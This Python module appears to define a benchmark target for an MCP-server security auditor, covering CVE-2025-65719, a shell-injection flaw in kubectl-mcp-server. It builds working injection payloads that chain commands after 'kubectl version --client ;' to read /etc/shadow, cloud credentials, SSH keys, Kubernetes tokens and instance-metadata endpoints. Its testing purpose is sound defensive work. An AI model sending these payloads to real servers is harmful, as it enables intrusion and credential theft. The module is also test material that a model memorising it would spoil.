"""CVE-2025-65719: kubectl-mcp-server command injection (CWE-94, command execution).

kubectl-mcp-server v1.1.1's minimal_wrapper runs process_natural_language's query through
`subprocess.run(command, shell=True)` when the query begins with `kubectl `, so a shell
metacharacter in the argument runs a command of the caller's choice and its stdout returns in the
tool response. v1.2.0 requires a `query` argument, parses with `shlex.split` and runs
`shell=False`, neutralising the injection.

Every exploit prefixes the kubectl trigger, then chains a command after `;`: `kubectl version
--client` exits first, then the injected reader runs. One dedicated exploit per kept place names
the location it reads. The slim image carries no curl, so the HTTP-endpoint readers use python3.

The benign call runs process_natural_language('get pods'), which the server translates to
`kubectl get pods`. kubectl is the real software the server shells out to and it contacts the
Kubernetes API, which cannot run in the closed fixture network, so the cluster endpoint is served
by a stand-in under its real address (the IP literal 45.55.0.10) from a capture written from the
Kubernetes API documentation; kubectl trusts the fixture authority through SSL_CERT_FILE and the
stand-in's leaf carries that IP as a SAN. A kubeconfig is baked at kubectl's default location in
both images, so the benign call returns an empty pod list for the default namespace with no error.
"""

import json
import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_layout import PROJECT
from evals.cve_places import Place, Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_base import PublicNames
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

SERVICE = "holdout-2025-65719-kubectl"
PATCHED = "holdout-2025-65719-kubectl-patched"
WORKING_DIRECTORY = PROJECT  # /srv/app, the checkout; the flaw runs through the server's own shell
STAND_IN_HOST = "45.55.0.10"  # the cluster endpoint the configured kubectl contacts
TOOL = "process_natural_language"
# The vulnerable branch fires only when the query begins with "kubectl "; the trigger exits with
# --client, then `;` chains the reader. The benign username (a plain query) carries no `;`.
TRIGGER = "kubectl version --client ; "

AIM = re.compile(r";\s*(?:cat|id|uname|python3)\b")

KEPT_PLACES = (
    "process-account-identity",
    "etc-shadow",
    "container-hostname",
    "proc-environ",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
)


def _cmd_for(place: Place) -> str:
    kind = place.kind
    if kind is PlantKind.FILE:
        coords = place.coordinates
        paths = coords.paths if coords.paths is not None else (coords.path,)
        resolved = " ".join(
            resolve_container_path(p, WORKING_DIRECTORY) for p in paths if p is not None
        )
        return f"cat {resolved}"
    if kind is PlantKind.ENV:
        return "cat /proc/self/environ"
    if kind is PlantKind.ACCOUNT:
        return "id"
    if kind is PlantKind.HOSTNAME:
        return "uname -n"
    if kind is PlantKind.HTTP_ENDPOINT:
        url = f"http://{place.coordinates.host}{place.coordinates.path}"
        read = f"urllib.request.urlopen('{url}',timeout=5).read().decode()"
        return f'python3 -c "import urllib.request;print({read})"'
    raise ValueError(f"{place.id}: kind {kind} has no command-execution exploit")


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        payload = TRIGGER + _cmd_for(places[place_id])
        await client.call_tool(TOOL, {"args": json.dumps([payload]), "kwargs": "{}"})

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # process_natural_language('get pods') -> `kubectl get pods` against the stand-in cluster,
    # which returns an empty pod list for the default namespace. `query` is required on v1.2.0.
    await client.call_tool(
        TOOL, {"args": json.dumps(["get pods"]), "kwargs": "{}", "query": "get pods"}
    )


TARGET = CVETarget(
    cve_id="CVE-2025-65719",
    severity="CVSS 9.8 (v3.1, GHSA-94gr-w3q5-rfqr)",
    mechanisms=frozenset({MechanismClass.COMMAND_EXECUTION}),
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=(SERVICE, "sentinel", "stand-in"),
    server_image=SERVICE,
    patched_image=PATCHED,
    planting_host=PlantingHost(
        SymbolicUser.UNPRIVILEGED,
        WORKING_DIRECTORY,
        has_network=False,
        public_names=PublicNames(stand_ins=(STAND_IN_HOST,), trust=("SSL_CERT_FILE",)),
    ),
    builder=command_injection_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Command injection (CWE-94): process_natural_language passes a query beginning with "
        "`kubectl ` to subprocess.run with shell=True, so a shell metacharacter in the argument "
        "executes an arbitrary command in the server's container."
    ),
    tools_filter=None,
)
